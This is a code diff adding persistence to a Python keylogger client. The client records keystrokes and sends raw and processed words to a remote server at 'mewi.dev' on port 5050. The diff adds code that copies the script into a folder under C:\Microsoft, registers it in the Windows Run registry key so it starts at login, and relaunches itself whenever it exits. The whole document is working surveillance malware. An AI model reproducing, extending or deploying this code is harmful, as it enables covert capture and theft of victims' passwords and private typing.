@@ -1,9 +1,13 @@
 import atexit
 import datetime
+import os
+import shutil
 import socket
 import string
 import subprocess
+import sys
 import threading
+import winreg
 
 
 class Client:
@@ -60,17 +64,20 @@ class Client:
 
             while True:
                 keyboard_event = keyboard.read_event()
-                if keyboard_event.event_type == "up":
+                if keyboard_event.event_type != "down":
                     continue
 
                 key = keyboard_event.name
 
-                if key in ["space", "enter"] and len(word) + len(word_processed):
+                if key in ["space", "enter"]:
+                    if not len(word) + len(word_processed):
+                        break
+
                     prefix = "_" if key == "space" else "↴"
                     self.send_message(f"r{prefix} {''.join(word)}")
                     self.send_message(f"p{prefix} {''.join(word_processed)}")
                     self.debug_message("KEYLOGGER",
-                                       f"Sent  {''.join(word_processed)}  and raw information to {self.host}:{self.port}")
+                                       f"Sending keys to {self.host}:{self.port}: {prefix}r/p | {''.join(word)} / {''.join(word_processed)}")
                     break
 
                 key_substitution_map = {"uppil": "↑",
@@ -171,6 +178,62 @@ class Client:
         self.stop = True
 
 
+class WindowsRegistryEditor:
+    @staticmethod
+    def enum_key(key: int):
+        sub_keys = []
+        try:
+            i = 1
+            while True:
+                sub_keys.append(winreg.EnumKey(key, i))
+                i += 1
+        except OSError:
+            return sub_keys
+
+    @staticmethod
+    def enum_value(key: int, sub_key: str):
+        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_READ) as open_key:
+            values = []
+            try:
+                i = 1
+                while True:
+                    values.append(winreg.EnumValue(open_key, i))
+                    i += 1
+            except OSError:
+                return values
+
+    @classmethod
+    def value_exists(cls, key: int, sub_key: str, value_name: str):
+        for value in cls.enum_value(key, sub_key):
+            if value[0] == value_name:
+                return True
+        return False
+
+    @classmethod
+    def add_value(cls, key: int, sub_key: str, value_name: str, value: str):
+        if cls.value_exists(key, sub_key, value_name):
+            return
+
+        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as open_key:
+            winreg.SetValueEx(open_key, value_name, 0, winreg.REG_SZ, value)
+
+    @classmethod
+    def edit_value(cls, key: int, sub_key: str, value_name: str, value: str):
+        if not cls.value_exists(key, sub_key, value_name):
+            raise Exception(f"{value_name=} does not exist at {key=} {sub_key=}")
+
+        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as open_key:
+            winreg.SetValueEx(open_key, value_name, 0, winreg.REG_SZ, value)
+
+    @classmethod
+    def remove_value(cls, key: int, sub_key: str, value_name: str):
+        if not cls.value_exists(key, sub_key, value_name):
+            return
+
+        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as open_key:
+            winreg.DeleteValue(open_key, value_name)
+
+
 class PackageManager:
     @staticmethod
     def package_is_installed(package: str):
@@ -200,11 +263,49 @@ class PackageManager:
 @atexit.register
 def disconnect():
     client.disconnect()
+    client.debug_message("RESPAWNING", "Respawning client script")
+    subprocess.Popen([sys.executable, __file__], shell=True)
+
+
+def set_os_startup_launch():
+    local_os = sys.platform
+    match local_os:
+        case "aix":
+            raise NotImplementedError
+
+        case "linux":
+            raise NotImplementedError
+
+        case "win32":
+            file_name = os.path.basename(__file__)
+            dest_dir = "C:\\Microsoft\\kl_client\\"
+            dest_path = dest_dir + file_name
+
+            if __file__ != dest_dir + file_name:
+                os.makedirs(dest_dir, exist_ok=True)
+                shutil.copy(__file__, dest_path)
+
+            key = winreg.HKEY_CURRENT_USER
+            sub_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+            if WindowsRegistryEditor.value_exists(key, sub_key, file_name):
+                WindowsRegistryEditor.edit_value(key, sub_key, file_name, f'"{sys.executable}" "{dest_path}"')
+                return
+
+            WindowsRegistryEditor.add_value(key, sub_key, file_name, f'"{sys.executable}" "{dest_path}"')
+            return
+
+        case "cygwin":
+            raise NotImplementedError
+        case "darwin":
+            raise NotImplementedError
 
 
 if __name__ == "__main__":
     PackageManager.install_package("keyboard")
     import keyboard
+
+    set_os_startup_launch()
 
     client = Client("mewi.dev", 5050, debug=True)
     client.start()
